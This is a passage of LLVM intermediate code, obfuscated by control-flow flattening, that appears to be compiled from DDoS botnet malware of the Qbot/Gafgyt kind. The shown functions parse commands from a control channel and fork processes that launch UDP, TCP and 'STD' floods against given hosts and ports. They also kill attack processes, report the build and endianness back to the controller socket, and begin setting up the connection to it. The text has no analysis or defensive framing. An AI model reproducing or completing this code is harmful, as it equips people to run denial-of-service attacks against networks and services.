  %400 = load i8**, i8*** %4, align 8
  %401 = getelementptr inbounds i8*, i8** %400, i64 3
  %402 = load i8*, i8** %401, align 8
  %403 = call i32 @atoi(i8* %402) #9
  %404 = icmp eq i32 %403, -1
  %405 = select i1 %404, i32 758143814, i32 1348680182
  store i32 %405, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  %407 = load i8**, i8*** %4, align 8
  %408 = getelementptr inbounds i8*, i8** %407, i64 2
  %409 = load i8*, i8** %408, align 8
  %410 = call i32 @atoi(i8* %409) #9
  %411 = icmp eq i32 %410, -1
  %412 = select i1 %411, i32 758143814, i32 -1129934046
  store i32 %412, i32* %switchVar
  br label %loopEnd

; <label>:413:                                    ; preds = %loopEntry
  %414 = load i8**, i8*** %4, align 8
  %415 = getelementptr inbounds i8*, i8** %414, i64 4
  %416 = load i8*, i8** %415, align 8
  %417 = call i32 @atoi(i8* %416) #9
  %418 = icmp eq i32 %417, -1
  %419 = select i1 %418, i32 758143814, i32 -527192805
  store i32 %419, i32* %switchVar
  br label %loopEnd

; <label>:420:                                    ; preds = %loopEntry
  %421 = load i8**, i8*** %4, align 8
  %422 = getelementptr inbounds i8*, i8** %421, i64 4
  %423 = load i8*, i8** %422, align 8
  %424 = call i32 @atoi(i8* %423) #9
  %425 = icmp sgt i32 %424, 1024
  %426 = select i1 %425, i32 758143814, i32 -1933278541
  store i32 %426, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = load i32, i32* %3, align 4
  %429 = icmp eq i32 %428, 6
  %430 = select i1 %429, i32 -950739585, i32 119326040
  store i32 %430, i32* %switchVar
  br label %loopEnd

; <label>:431:                                    ; preds = %loopEntry
  %432 = load i8**, i8*** %4, align 8
  %433 = getelementptr inbounds i8*, i8** %432, i64 5
  %434 = load i8*, i8** %433, align 8
  %435 = call i32 @atoi(i8* %434) #9
  %436 = icmp slt i32 %435, 1
  %437 = select i1 %436, i32 758143814, i32 119326040
  store i32 %437, i32* %switchVar
  br label %loopEnd

; <label>:438:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
  %440 = load i8**, i8*** %4, align 8
  %441 = getelementptr inbounds i8*, i8** %440, i64 1
  %442 = load i8*, i8** %441, align 8
  store i8* %442, i8** %16, align 8
  %443 = load i8**, i8*** %4, align 8
  %444 = getelementptr inbounds i8*, i8** %443, i64 2
  %445 = load i8*, i8** %444, align 8
  %446 = call i32 @atoi(i8* %445) #9
  store i32 %446, i32* %17, align 4
  %447 = load i8**, i8*** %4, align 8
  %448 = getelementptr inbounds i8*, i8** %447, i64 3
  %449 = load i8*, i8** %448, align 8
  %450 = call i32 @atoi(i8* %449) #9
  store i32 %450, i32* %18, align 4
  %451 = load i8**, i8*** %4, align 8
  %452 = getelementptr inbounds i8*, i8** %451, i64 4
  %453 = load i8*, i8** %452, align 8
  %454 = call i32 @atoi(i8* %453) #9
  store i32 %454, i32* %19, align 4
  %455 = load i32, i32* %3, align 4
  %456 = icmp eq i32 %455, 6
  %457 = select i1 %456, i32 1033791472, i32 2098905230
  store i32 %457, i32* %switchVar
  br label %loopEnd

; <label>:458:                                    ; preds = %loopEntry
  %459 = load i8**, i8*** %4, align 8
  %460 = getelementptr inbounds i8*, i8** %459, i64 5
  %461 = load i8*, i8** %460, align 8
  %462 = call i32 @atoi(i8* %461) #9
  store i32 -416310411, i32* %switchVar
  store i32 %462, i32* %.reg2mem2
  br label %loopEnd

; <label>:463:                                    ; preds = %loopEntry
  store i32 -416310411, i32* %switchVar
  store i32 10, i32* %.reg2mem2
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %20, align 4
  store i32 32, i32* %21, align 4
  %465 = load i8*, i8** %16, align 8
  %466 = call i8* @strstr(i8* %465, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %467 = icmp ne i8* %466, null
  %468 = select i1 %467, i32 902086530, i32 -791691418
  store i32 %468, i32* %switchVar
  br label %loopEnd

; <label>:469:                                    ; preds = %loopEntry
  %470 = load i8*, i8** %16, align 8
  %471 = call i8* @strtok(i8* %470, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %471, i8** %22, align 8
  store i32 -918932116, i32* %switchVar
  br label %loopEnd

; <label>:472:                                    ; preds = %loopEntry
  %473 = load i8*, i8** %22, align 8
  %474 = icmp ne i8* %473, null
  %475 = select i1 %474, i32 -867544609, i32 117673867
  store i32 %475, i32* %switchVar
  br label %loopEnd

; <label>:476:                                    ; preds = %loopEntry
  %477 = call i32 @listFork()
  %478 = icmp ne i32 %477, 0
  %479 = select i1 %478, i32 1630191936, i32 1773254161
  store i32 %479, i32* %switchVar
  br label %loopEnd

; <label>:480:                                    ; preds = %loopEntry
  %481 = load i8*, i8** %22, align 8
  %482 = load i32, i32* %17, align 4
  %483 = load i32, i32* %18, align 4
  %484 = load i32, i32* %19, align 4
  %485 = load i32, i32* %20, align 4
  %486 = load i32, i32* %21, align 4
  call void @SendUDP(i8* %481, i32 %482, i32 %483, i32 %484, i32 %485, i32 %486)
  call void @_exit(i32 0) #11
  unreachable

; <label>:487:                                    ; preds = %loopEntry
  %488 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %488, i8** %22, align 8
  store i32 -918932116, i32* %switchVar
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  store i32 -563543003, i32* %switchVar
  br label %loopEnd

; <label>:490:                                    ; preds = %loopEntry
  %491 = call i32 @listFork()
  %492 = icmp ne i32 %491, 0
  %493 = select i1 %492, i32 1287650895, i32 -281597169
  store i32 %493, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  %496 = load i8*, i8** %16, align 8
  %497 = load i32, i32* %17, align 4
  %498 = load i32, i32* %18, align 4
  %499 = load i32, i32* %19, align 4
  %500 = load i32, i32* %20, align 4
  %501 = load i32, i32* %21, align 4
  call void @SendUDP(i8* %496, i32 %497, i32 %498, i32 %499, i32 %500, i32 %501)
  call void @_exit(i32 0) #11
  unreachable

; <label>:502:                                    ; preds = %loopEntry
  store i32 -2012111234, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i8**, i8*** %4, align 8
  %505 = getelementptr inbounds i8*, i8** %504, i64 0
  %506 = load i8*, i8** %505, align 8
  %507 = call i32 @strcmp(i8* %506, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.192, i32 0, i32 0)) #9
  %508 = icmp ne i32 %507, 0
  %509 = select i1 %508, i32 1846088708, i32 176396609
  store i32 %509, i32* %switchVar
  br label %loopEnd

; <label>:510:                                    ; preds = %loopEntry
  %511 = load i32, i32* %3, align 4
  %512 = icmp slt i32 %511, 6
  %513 = select i1 %512, i32 1727725243, i32 -637957776
  store i32 %513, i32* %switchVar
  br label %loopEnd

; <label>:514:                                    ; preds = %loopEntry
  %515 = load i8**, i8*** %4, align 8
  %516 = getelementptr inbounds i8*, i8** %515, i64 3
  %517 = load i8*, i8** %516, align 8
  %518 = call i32 @atoi(i8* %517) #9
  %519 = icmp eq i32 %518, -1
  %520 = select i1 %519, i32 1727725243, i32 1336961841
  store i32 %520, i32* %switchVar
  br label %loopEnd

; <label>:521:                                    ; preds = %loopEntry
  %522 = load i8**, i8*** %4, align 8
  %523 = getelementptr inbounds i8*, i8** %522, i64 2
  %524 = load i8*, i8** %523, align 8
  %525 = call i32 @atoi(i8* %524) #9
  %526 = icmp eq i32 %525, -1
  %527 = select i1 %526, i32 1727725243, i32 152023676
  store i32 %527, i32* %switchVar
  br label %loopEnd

; <label>:528:                                    ; preds = %loopEntry
  %529 = load i32, i32* %3, align 4
  %530 = icmp sgt i32 %529, 5
  %531 = select i1 %530, i32 -1511713600, i32 -826673759
  store i32 %531, i32* %switchVar
  br label %loopEnd

; <label>:532:                                    ; preds = %loopEntry
  %533 = load i8**, i8*** %4, align 8
  %534 = getelementptr inbounds i8*, i8** %533, i64 5
  %535 = load i8*, i8** %534, align 8
  %536 = call i32 @atoi(i8* %535) #9
  %537 = icmp slt i32 %536, 0
  %538 = select i1 %537, i32 1727725243, i32 -826673759
  store i32 %538, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  %540 = load i32, i32* %3, align 4
  %541 = icmp eq i32 %540, 7
  %542 = select i1 %541, i32 -1353460412, i32 150272358
  store i32 %542, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i8**, i8*** %4, align 8
  %545 = getelementptr inbounds i8*, i8** %544, i64 6
  %546 = load i8*, i8** %545, align 8
  %547 = call i32 @atoi(i8* %546) #9
  %548 = icmp slt i32 %547, 1
  %549 = select i1 %548, i32 1727725243, i32 150272358
  store i32 %549, i32* %switchVar
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:551:                                    ; preds = %loopEntry
  %552 = load i8**, i8*** %4, align 8
  %553 = getelementptr inbounds i8*, i8** %552, i64 1
  %554 = load i8*, i8** %553, align 8
  store i8* %554, i8** %23, align 8
  %555 = load i8**, i8*** %4, align 8
  %556 = getelementptr inbounds i8*, i8** %555, i64 2
  %557 = load i8*, i8** %556, align 8
  %558 = call i32 @atoi(i8* %557) #9
  store i32 %558, i32* %24, align 4
  %559 = load i8**, i8*** %4, align 8
  %560 = getelementptr inbounds i8*, i8** %559, i64 3
  %561 = load i8*, i8** %560, align 8
  %562 = call i32 @atoi(i8* %561) #9
  store i32 %562, i32* %25, align 4
  %563 = load i8**, i8*** %4, align 8
  %564 = getelementptr inbounds i8*, i8** %563, i64 4
  %565 = load i8*, i8** %564, align 8
  store i8* %565, i8** %26, align 8
  %566 = load i32, i32* %3, align 4
  %567 = icmp eq i32 %566, 7
  %568 = select i1 %567, i32 -1610509083, i32 -1180833452
  store i32 %568, i32* %switchVar
  br label %loopEnd

; <label>:569:                                    ; preds = %loopEntry
  %570 = load i8**, i8*** %4, align 8
  %571 = getelementptr inbounds i8*, i8** %570, i64 6
  %572 = load i8*, i8** %571, align 8
  %573 = call i32 @atoi(i8* %572) #9
  store i32 -1856527863, i32* %switchVar
  store i32 %573, i32* %.reg2mem4
  br label %loopEnd

; <label>:574:                                    ; preds = %loopEntry
  store i32 -1856527863, i32* %switchVar
  store i32 10, i32* %.reg2mem4
  br label %loopEnd

; <label>:575:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %27, align 4
  %576 = load i32, i32* %3, align 4
  %577 = icmp sgt i32 %576, 5
  %578 = select i1 %577, i32 624671124, i32 297144151
  store i32 %578, i32* %switchVar
  br label %loopEnd

; <label>:579:                                    ; preds = %loopEntry
  %580 = load i8**, i8*** %4, align 8
  %581 = getelementptr inbounds i8*, i8** %580, i64 5
  %582 = load i8*, i8** %581, align 8
  %583 = call i32 @atoi(i8* %582) #9
  store i32 -1034253379, i32* %switchVar
  store i32 %583, i32* %.reg2mem6
  br label %loopEnd

; <label>:584:                                    ; preds = %loopEntry
  store i32 -1034253379, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:585:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %28, align 4
  store i32 32, i32* %29, align 4
  %586 = load i8*, i8** %23, align 8
  %587 = call i8* @strstr(i8* %586, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %588 = icmp ne i8* %587, null
  %589 = select i1 %588, i32 -1102418982, i32 -1824722292
  store i32 %589, i32* %switchVar
  br label %loopEnd

; <label>:590:                                    ; preds = %loopEntry
  %591 = load i8*, i8** %23, align 8
  %592 = call i8* @strtok(i8* %591, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %592, i8** %30, align 8
  store i32 1922623066, i32* %switchVar
  br label %loopEnd

; <label>:593:                                    ; preds = %loopEntry
  %594 = load i8*, i8** %30, align 8
  %595 = icmp ne i8* %594, null
  %596 = select i1 %595, i32 -258368808, i32 1315118981
  store i32 %596, i32* %switchVar
  br label %loopEnd

; <label>:597:                                    ; preds = %loopEntry
  %598 = call i32 @listFork()
  %599 = icmp ne i32 %598, 0
  %600 = select i1 %599, i32 -491864140, i32 -1160638906
  store i32 %600, i32* %switchVar
  br label %loopEnd

; <label>:601:                                    ; preds = %loopEntry
  %602 = load i8*, i8** %30, align 8
  %603 = load i32, i32* %24, align 4
  %604 = load i32, i32* %25, align 4
  %605 = load i8*, i8** %26, align 8
  %606 = load i32, i32* %28, align 4
  %607 = load i32, i32* %27, align 4
  %608 = load i32, i32* %29, align 4
  call void @SendTCP(i8* %602, i32 %603, i32 %604, i8* %605, i32 %606, i32 %607, i32 %608)
  call void @_exit(i32 0) #11
  unreachable

; <label>:609:                                    ; preds = %loopEntry
  %610 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %610, i8** %30, align 8
  store i32 1922623066, i32* %switchVar
  br label %loopEnd

; <label>:611:                                    ; preds = %loopEntry
  store i32 20508923, i32* %switchVar
  br label %loopEnd

; <label>:612:                                    ; preds = %loopEntry
  %613 = call i32 @listFork()
  %614 = icmp ne i32 %613, 0
  %615 = select i1 %614, i32 1670611244, i32 -1003763074
  store i32 %615, i32* %switchVar
  br label %loopEnd

; <label>:616:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:617:                                    ; preds = %loopEntry
  %618 = load i8*, i8** %23, align 8
  %619 = load i32, i32* %24, align 4
  %620 = load i32, i32* %25, align 4
  %621 = load i8*, i8** %26, align 8
  %622 = load i32, i32* %28, align 4
  %623 = load i32, i32* %27, align 4
  %624 = load i32, i32* %29, align 4
  call void @SendTCP(i8* %618, i32 %619, i32 %620, i8* %621, i32 %622, i32 %623, i32 %624)
  call void @_exit(i32 0) #11
  unreachable

; <label>:625:                                    ; preds = %loopEntry
  store i32 1846088708, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  %627 = load i8**, i8*** %4, align 8
  %628 = getelementptr inbounds i8*, i8** %627, i64 0
  %629 = load i8*, i8** %628, align 8
  %630 = call i32 @strcmp(i8* %629, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.193, i32 0, i32 0)) #9
  %631 = icmp ne i32 %630, 0
  %632 = select i1 %631, i32 -363954849, i32 -386912496
  store i32 %632, i32* %switchVar
  br label %loopEnd

; <label>:633:                                    ; preds = %loopEntry
  %634 = load i32, i32* %3, align 4
  %635 = icmp slt i32 %634, 4
  %636 = select i1 %635, i32 -1232931767, i32 708901113
  store i32 %636, i32* %switchVar
  br label %loopEnd

; <label>:637:                                    ; preds = %loopEntry
  %638 = load i8**, i8*** %4, align 8
  %639 = getelementptr inbounds i8*, i8** %638, i64 2
  %640 = load i8*, i8** %639, align 8
  %641 = call i32 @atoi(i8* %640) #9
  %642 = icmp slt i32 %641, 1
  %643 = select i1 %642, i32 -1232931767, i32 1635301913
  store i32 %643, i32* %switchVar
  br label %loopEnd

; <label>:644:                                    ; preds = %loopEntry
  %645 = load i8**, i8*** %4, align 8
  %646 = getelementptr inbounds i8*, i8** %645, i64 3
  %647 = load i8*, i8** %646, align 8
  %648 = call i32 @atoi(i8* %647) #9
  %649 = icmp slt i32 %648, 1
  %650 = select i1 %649, i32 -1232931767, i32 1179591996
  store i32 %650, i32* %switchVar
  br label %loopEnd

; <label>:651:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:652:                                    ; preds = %loopEntry
  %653 = load i8**, i8*** %4, align 8
  %654 = getelementptr inbounds i8*, i8** %653, i64 1
  %655 = load i8*, i8** %654, align 8
  store i8* %655, i8** %31, align 8
  %656 = load i8**, i8*** %4, align 8
  %657 = getelementptr inbounds i8*, i8** %656, i64 2
  %658 = load i8*, i8** %657, align 8
  %659 = call i32 @atoi(i8* %658) #9
  store i32 %659, i32* %32, align 4
  %660 = load i8**, i8*** %4, align 8
  %661 = getelementptr inbounds i8*, i8** %660, i64 3
  %662 = load i8*, i8** %661, align 8
  %663 = call i32 @atoi(i8* %662) #9
  store i32 %663, i32* %33, align 4
  %664 = load i8*, i8** %31, align 8
  %665 = call i8* @strstr(i8* %664, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #9
  %666 = icmp ne i8* %665, null
  %667 = select i1 %666, i32 837668723, i32 -126355794
  store i32 %667, i32* %switchVar
  br label %loopEnd

; <label>:668:                                    ; preds = %loopEntry
  %669 = load i8*, i8** %31, align 8
  %670 = call i8* @strtok(i8* %669, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %670, i8** %34, align 8
  store i32 -290696839, i32* %switchVar
  br label %loopEnd

; <label>:671:                                    ; preds = %loopEntry
  %672 = load i8*, i8** %34, align 8
  %673 = icmp ne i8* %672, null
  %674 = select i1 %673, i32 -694186, i32 -31553398
  store i32 %674, i32* %switchVar
  br label %loopEnd

; <label>:675:                                    ; preds = %loopEntry
  %676 = call i32 @listFork()
  %677 = icmp ne i32 %676, 0
  %678 = select i1 %677, i32 8985579, i32 -1050999893
  store i32 %678, i32* %switchVar
  br label %loopEnd

; <label>:679:                                    ; preds = %loopEntry
  %680 = load i8*, i8** %34, align 8
  %681 = load i32, i32* %32, align 4
  %682 = load i32, i32* %33, align 4
  call void @SendSTD(i8* %680, i32 %681, i32 %682)
  call void @_exit(i32 0) #11
  unreachable

; <label>:683:                                    ; preds = %loopEntry
  %684 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %684, i8** %34, align 8
  store i32 -290696839, i32* %switchVar
  br label %loopEnd

; <label>:685:                                    ; preds = %loopEntry
  store i32 1738542061, i32* %switchVar
  br label %loopEnd

; <label>:686:                                    ; preds = %loopEntry
  %687 = call i32 @listFork()
  %688 = icmp ne i32 %687, 0
  %689 = select i1 %688, i32 271524898, i32 -2052420110
  store i32 %689, i32* %switchVar
  br label %loopEnd

; <label>:690:                                    ; preds = %loopEntry
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:691:                                    ; preds = %loopEntry
  %692 = load i8*, i8** %31, align 8
  %693 = load i32, i32* %32, align 4
  %694 = load i32, i32* %33, align 4
  call void @SendSTD(i8* %692, i32 %693, i32 %694)
  call void @_exit(i32 0) #11
  unreachable

; <label>:695:                                    ; preds = %loopEntry
  store i32 -363954849, i32* %switchVar
  br label %loopEnd

; <label>:696:                                    ; preds = %loopEntry
  %697 = load i8**, i8*** %4, align 8
  %698 = getelementptr inbounds i8*, i8** %697, i64 0
  %699 = load i8*, i8** %698, align 8
  %700 = call i32 @strcmp(i8* %699, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.194, i32 0, i32 0)) #9
  %701 = icmp ne i32 %700, 0
  %702 = select i1 %701, i32 -1927237122, i32 415768360
  store i32 %702, i32* %switchVar
  br label %loopEnd

; <label>:703:                                    ; preds = %loopEntry
  store i32 0, i32* %35, align 4
  store i64 0, i64* %36, align 8
  store i32 -302393387, i32* %switchVar
  br label %loopEnd

; <label>:704:                                    ; preds = %loopEntry
  %705 = load i64, i64* %36, align 8
  %706 = load i64, i64* @numpids, align 8
  %707 = icmp ult i64 %705, %706
  %708 = select i1 %707, i32 359323319, i32 -723004209
  store i32 %708, i32* %switchVar
  br label %loopEnd

; <label>:709:                                    ; preds = %loopEntry
  %710 = load i32*, i32** @pids, align 8
  %711 = load i64, i64* %36, align 8
  %712 = getelementptr inbounds i32, i32* %710, i64 %711
  %713 = load i32, i32* %712, align 4
  %714 = icmp ne i32 %713, 0
  %715 = select i1 %714, i32 853143549, i32 -2065663767
  store i32 %715, i32* %switchVar
  br label %loopEnd

; <label>:716:                                    ; preds = %loopEntry
  %717 = load i32*, i32** @pids, align 8
  %718 = load i64, i64* %36, align 8
  %719 = getelementptr inbounds i32, i32* %717, i64 %718
  %720 = load i32, i32* %719, align 4
  %721 = call i32 @getpid() #5
  %722 = icmp ne i32 %720, %721
  %723 = select i1 %722, i32 -1500812569, i32 -2065663767
  store i32 %723, i32* %switchVar
  br label %loopEnd

; <label>:724:                                    ; preds = %loopEntry
  %725 = load i32*, i32** @pids, align 8
  %726 = load i64, i64* %36, align 8
  %727 = getelementptr inbounds i32, i32* %725, i64 %726
  %728 = load i32, i32* %727, align 4
  %729 = call i32 @kill(i32 %728, i32 9) #5
  %730 = load i32, i32* %35, align 4
  %731 = add nsw i32 %730, 1
  store i32 %731, i32* %35, align 4
  store i32 -2065663767, i32* %switchVar
  br label %loopEnd

; <label>:732:                                    ; preds = %loopEntry
  store i32 1193599859, i32* %switchVar
  br label %loopEnd

; <label>:733:                                    ; preds = %loopEntry
  %734 = load i64, i64* %36, align 8
  %735 = add i64 %734, 1
  store i64 %735, i64* %36, align 8
  store i32 -302393387, i32* %switchVar
  br label %loopEnd

; <label>:736:                                    ; preds = %loopEntry
  %737 = load i32, i32* %35, align 4
  %738 = icmp sgt i32 %737, 0
  %739 = select i1 %738, i32 -1262172476, i32 500349447
  store i32 %739, i32* %switchVar
  br label %loopEnd

; <label>:740:                                    ; preds = %loopEntry
  store i32 121633294, i32* %switchVar
  br label %loopEnd

; <label>:741:                                    ; preds = %loopEntry
  store i32 121633294, i32* %switchVar
  br label %loopEnd

; <label>:742:                                    ; preds = %loopEntry
  store i32 -1927237122, i32* %switchVar
  br label %loopEnd

; <label>:743:                                    ; preds = %loopEntry
  %744 = load i8**, i8*** %4, align 8
  %745 = getelementptr inbounds i8*, i8** %744, i64 0
  %746 = load i8*, i8** %745, align 8
  %747 = call i32 @strcmp(i8* %746, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.195, i32 0, i32 0)) #9
  %748 = icmp ne i32 %747, 0
  %749 = select i1 %748, i32 962664299, i32 -1343937859
  store i32 %749, i32* %switchVar
  br label %loopEnd

; <label>:750:                                    ; preds = %loopEntry
  call void @CleanDevice()
  %751 = load i32, i32* @mainCommSock, align 4
  %752 = call i8* @getBuild()
  %753 = call i32 @getEndianness()
  %754 = call i32 (i32, i8*, ...) @sockprintf(i32 %751, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.196, i32 0, i32 0), i8* %752, i32 %753)
  store i32 962664299, i32* %switchVar
  br label %loopEnd

; <label>:755:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %750, %743, %742, %741, %740, %736, %733, %732, %724, %716, %709, %704, %703, %696, %695, %690, %686, %685, %683, %675, %671, %668, %652, %651, %644, %637, %633, %626, %625, %616, %612, %611, %609, %597, %593, %590, %585, %584, %579, %575, %574, %569, %551, %550, %543, %539, %532, %528, %521, %514, %510, %503, %502, %494, %490, %489, %487, %476, %472, %469, %464, %463, %458, %439, %438, %431, %427, %420, %413, %406, %399, %395, %388, %387, %379, %375, %374, %373, %369, %368, %366, %358, %354, %353, %349, %345, %342, %330, %329, %322, %318, %311, %287, %283, %282, %275, %268, %264, %257, %233, %229, %228, %221, %214, %210, %203, %179, %175, %174, %167, %160, %156, %149, %148, %147, %130, %123, %120, %119, %115, %108, %107, %104, %84, %83, %82, %81, %77, %75, %71, %70, %66, %65, %58, %51, %44, %43, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) #3

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @getppid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -748420458, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar11 = load i32, i32* %switchVar
  switch i32 %switchVar11, label %switchDefault [
    i32 -748420458, label %NodeBlock9
    i32 675603730, label %NodeBlock7
    i32 127196640, label %LeafBlock5
    i32 -2092212354, label %LeafBlock3
    i32 -62769355, label %NodeBlock
    i32 1033413143, label %LeafBlock1
    i32 2025689713, label %LeafBlock
    i32 514337263, label %20
    i32 1887314362, label %21
    i32 -1811039844, label %22
    i32 -951147954, label %23
    i32 52965237, label %NewDefault
    i32 952631401, label %24
    i32 1931979860, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload17 = load volatile i32, i32* %.reg2mem
  %Pivot10 = icmp slt i32 %.reload17, 33751041
  %13 = select i1 %Pivot10, i32 -62769355, i32 675603730
  store i32 %13, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload13 = load volatile i32, i32* %.reg2mem
  %Pivot8 = icmp slt i32 %.reload13, 50462976
  %14 = select i1 %Pivot8, i32 -2092212354, i32 127196640
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock5:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf6 = icmp eq i32 %.reload, 50462976
  %15 = select i1 %SwitchLeaf6, i32 1887314362, i32 52965237
  store i32 %15, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload12 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload12, 33751041
  %16 = select i1 %SwitchLeaf4, i32 -1811039844, i32 52965237
  store i32 %16, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload16 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload16, 16777986
  %17 = select i1 %Pivot, i32 2025689713, i32 1033413143
  store i32 %17, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload14 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload14, 16777986
  %18 = select i1 %SwitchLeaf2, i32 -951147954, i32 52965237
  store i32 %18, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload15 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload15, 66051
  %19 = select i1 %SwitchLeaf, i32 514337263, i32 52965237
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  store i32 ptrtoint ([11 x i8]* @.str.199 to i32), i32* %1, align 4
  store i32 1931979860, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 ptrtoint ([14 x i8]* @.str.200 to i32), i32* %1, align 4
  store i32 1931979860, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 ptrtoint ([13 x i8]* @.str.201 to i32), i32* %1, align 4
  store i32 1931979860, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 ptrtoint ([16 x i8]* @.str.202 to i32), i32* %1, align 4
  store i32 1931979860, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 952631401, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i32 ptrtoint ([8 x i8]* @.str.203 to i32), i32* %1, align 4
  store i32 1931979860, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %1, align 4
  ret i32 %26

loopEnd:                                          ; preds = %24, %NewDefault, %23, %22, %21, %20, %LeafBlock, %LeafBlock1, %NodeBlock, %LeafBlock3, %LeafBlock5, %NodeBlock7, %NodeBlock9, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 335142321, i32* %switchVar
